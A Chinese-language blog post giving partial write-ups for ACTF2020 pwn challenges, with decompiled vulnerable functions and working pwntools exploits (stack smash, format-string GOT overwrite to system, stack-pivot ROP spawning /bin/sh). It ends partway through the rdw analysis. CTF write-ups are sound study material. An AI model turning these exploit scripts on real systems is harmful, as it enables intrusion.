<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="【ACTF2020】 部分wp"><meta name="keywords" content="ctf"><meta name="author" content="Soinux"><meta name="copyright" content="Soinux"><title>【ACTF2020】 部分wp | Soinux's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN部分wp"><span class="toc-number">1.</span> <span class="toc-text">PWN部分wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Secret-Of-Girlfriend"><span class="toc-number">1.1.</span> <span class="toc-text">Secret_Of_Girlfriend</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检查保护"><span class="toc-number">1.1.1.</span> <span class="toc-text">检查保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">1.1.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#repeate"><span class="toc-number">1.2.</span> <span class="toc-text">repeate</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检查保护-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">检查保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frame"><span class="toc-number">1.3.</span> <span class="toc-text">frame</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检查保护-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">检查保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rdw"><span class="toc-number">1.4.</span> <span class="toc-text">rdw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-部分wp"><span class="toc-number">2.</span> <span class="toc-text">Misc 部分wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#饭友记"><span class="toc-number">2.1.</span> <span class="toc-text">饭友记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#密码守护者"><span class="toc-number">2.2.</span> <span class="toc-text">密码守护者</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Soinux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">10</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">2</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">2</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://www.baidu.com" target="_blank" rel="noopener">BestFriend</a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Soinux's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">【ACTF2020】 部分wp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-06</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><blockquote>
<p>又是一次被按在地上摩擦的经历(悲)</p>
</blockquote>
<h1 id="PWN部分wp"><a href="#PWN部分wp" class="headerlink" title="PWN部分wp"></a>PWN部分wp</h1><h2 id="Secret-Of-Girlfriend"><a href="#Secret-Of-Girlfriend" class="headerlink" title="Secret_Of_Girlfriend"></a>Secret_Of_Girlfriend</h2><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;actf&#x2F;neww&#x2F;sec&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>唯一有用的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_40084D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+1h] [rbp-1Fh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hey bro, forgive me this time. Fortunately, I have a back-up copy."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But before that, may I have your name first please? I...fogot =v=."</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x150</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Did I read too long?"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"emmm...%s, Forget that, I'm calling write function now.\n"</span>, &amp;buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">3u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s2, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Oh, I think I should run at once."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>read处存在栈溢出，但程序开了Canary， 而且没法泄露</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000006010E0 s3              db &#39;ACTF&#123;Here&#39;,27h,&#39;s_the_flag_in_server_file&#125;&#39;,0</span><br></pre></td></tr></table></figure>
<p>在程序运行时内存里就存在我们想要的flag， 结合上面的栈溢出，利用stack smash就可获得flag</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x150</span>, <span class="number">8</span>):</span><br><span class="line">    sh = remote(host=<span class="string">'39.107.46.219'</span>, port = <span class="number">40010</span>)</span><br><span class="line"><span class="comment">#sh = process('./sec')</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    payload = <span class="string">b'a'</span> * i + p64(<span class="number">0x6010e0</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'=v=.\n'</span>, payload)</span><br><span class="line">    sh.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">    flag = sh.recvuntil(<span class="string">' terminatedn'</span>)</span><br><span class="line">    <span class="keyword">if</span> flag[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">'ACTF'</span>:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="repeate"><a href="#repeate" class="headerlink" title="repeate"></a>repeate</h2><h3 id="检查保护-1"><a href="#检查保护-1" class="headerlink" title="检查保护"></a>检查保护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;actf&#x2F;neww&#x2F;repeat&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400755</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">20</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I am monitoring your screen..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Have a try..."</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt; "</span>);</span><br><span class="line">    buf[(<span class="keyword">signed</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>LL) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf, <span class="string">"quit"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ok..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I am going to monitor others..."</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>格式化字符串漏洞， 因为buf可控， 可以直接将strncmp函数got表项改为system，再下一次循环时，将buf设为’/bin/sh\x00’,唯一要注意的就是payload的长度不能超过0x30，且got表的修改要一次性完成</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">sh = remote(host=<span class="string">'actf.node.csuaurora.org'</span>, port=<span class="number">28135</span>)</span><br><span class="line"><span class="comment">#sh = process('./repeat')</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">e = ELF(<span class="string">'./repeat'</span>)</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">strncmp_got = e.got[<span class="string">'strncmp'</span>]</span><br><span class="line">payload = <span class="string">b'%9$saaaa'</span> + p64(puts_got)</span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt; '</span>, payload)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">'puts_addr:'</span> + hex(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc.dump(<span class="string">'system'</span>) + libc_base</span><br><span class="line">success(<span class="string">'system_addr:'</span> + hex(system_addr))</span><br><span class="line">system_addr_p64 = p64(system_addr)</span><br><span class="line">part1 = u16(system_addr_p64[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line">part2 = u16(system_addr_p64[<span class="number">2</span>:<span class="number">4</span>])</span><br><span class="line">success(<span class="string">'part1:'</span> + hex(part1) + <span class="string">' part2:'</span> + hex(part2))</span><br><span class="line"><span class="keyword">if</span> part2 - part1 &lt; <span class="number">0</span>:</span><br><span class="line">    part2 = part2 - part1 + <span class="number">0xffff</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    part2 = part2 - part1</span><br><span class="line">payload = <span class="string">b'%'</span> + bytes(str(part1), <span class="string">'utf-8'</span>) + <span class="string">b'c%12$hn'</span> + <span class="string">b'%'</span> + bytes(str(part2), <span class="string">'utf-8'</span>) + <span class="string">b'c%13$hn'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">payload += p64(strncmp_got) + p64(strncmp_got + <span class="number">2</span>)</span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt; '</span>, payload)</span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="frame"><a href="#frame" class="headerlink" title="frame"></a>frame</h2><h3 id="检查保护-2"><a href="#检查保护-2" class="headerlink" title="检查保护"></a>检查保护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;actf&#x2F;neww&#x2F;frame&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Don't cry, I'll give you a gift:%p\n"</span>, &amp;s);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"&gt;"</span>, <span class="number">1u</span>LL);</span><br><span class="line">    fflush(_bss_start);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x70</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;s);</span><br><span class="line">    fflush(_bss_start);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一上来先给了我们栈地址，read处栈溢出，但最多覆盖rbp的值和返回地址。因为已知栈地址，可以frame faking伪造栈帧进行rop</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">from LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch='amd64', os='linux', log_level='debug')</span><br><span class="line">sh = remote(host='actf.node.csuaurora.org', port=28495)</span><br><span class="line">#sh=process('./frame')</span><br><span class="line"><span class="meta">#gdb.attach(sh)</span></span><br><span class="line">e = ELF('./frame')</span><br><span class="line">printf_plt = e.plt['printf']</span><br><span class="line">read_got = e.got['read']</span><br><span class="line">rdi_ret = <span class="number">0x4012db</span></span><br><span class="line">rdx_rdi_ret = <span class="number">0x40118c</span></span><br><span class="line">  </span><br><span class="line">leave_ret = <span class="number">0x40125f</span></span><br><span class="line">payload = b<span class="number">'</span>a<span class="number">'</span> * <span class="number">0x58</span></span><br><span class="line">sh.recvuntil('gift:')</span><br><span class="line">addr = sh.recvline().strip(b<span class="number">'</span>\n<span class="number">'</span>)</span><br><span class="line">addr = <span class="keyword">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">success('addr:' + hex(addr))</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>, payload)</span><br><span class="line">sh.recvline()</span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, b<span class="number">'</span>\x00<span class="number">'</span>))</span><br><span class="line">success('canary:' + hex(canary))</span><br><span class="line">payload = p64(addr) + p64(rdi_ret) + p64(read_got) + p64(printf_plt) + p64(<span class="number">0x401172</span>)</span><br><span class="line">payload += b<span class="number">'</span>a<span class="number">'</span> * <span class="number">0x30</span></span><br><span class="line">payload += p64(canary) + p64(addr) + p64(leave_ret)</span><br><span class="line">sh.sendafter(<span class="string">'&gt;'</span>, payload)</span><br><span class="line">sh.recv(<span class="number">6</span>)</span><br><span class="line">read_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="number">'</span>\x00<span class="number">'</span>))</span><br><span class="line">success('read_addr:' + hex(read_addr))</span><br><span class="line">libc = LibcSearcher('read', read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump('read')</span><br><span class="line">system_addr = libc_base + libc.dump('system')</span><br><span class="line">str_bin_sh = libc_base + libc.dump('str_bin_sh')</span><br><span class="line">success('system_addr:' + hex(system_addr))</span><br><span class="line"></span><br><span class="line">payload = b<span class="number">'</span>a<span class="number">'</span> * <span class="number">0x58</span></span><br><span class="line">sh.recvuntil('gift:')</span><br><span class="line">addr = sh.recvline().strip(b<span class="number">'</span>\n<span class="number">'</span>)</span><br><span class="line">addr = <span class="keyword">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">success('addr:' + hex(addr))</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>, payload)</span><br><span class="line">sh.recvline()</span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, b<span class="number">'</span>\x00<span class="number">'</span>))</span><br><span class="line">success('canary:' + hex(canary))</span><br><span class="line">payload = p64(addr) + p64(rdi_ret) + p64(str_bin_sh) + p64(system_addr)</span><br><span class="line">payload += b<span class="number">'</span>a<span class="number">'</span> * <span class="number">0x38</span></span><br><span class="line">payload += p64(canary)  + p64(addr) + p64(leave_ret)</span><br><span class="line">sh.sendafter(<span class="string">'&gt;'</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rdw"><a href="#rdw" class="headerlink" title="rdw"></a>rdw</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;actf&#x2F;neww&#x2F;rdw&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>main函数里连续调用三个函数， 第一个函数内提供给我们一个可控的0x10x大小的内存地址0x601090,并且载入open函数，第二个函数设置了seccomp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0011</span><br><span class="line"> 0005: 0x15 0x00 0x04 0x00000001  if (A !&#x3D; write) goto 0010</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000024  A &#x3D; count &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line"> 0007: 0x15 0x00 0x02 0x00000000  if (A !&#x3D; 0x0) goto 0010</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000020  A &#x3D; count # write(fd, buf, count)</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000010  if (A &#x3D;&#x3D; 0x10) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>禁用了64位的write 和 execve</p>
<p>第三个函数：</p>
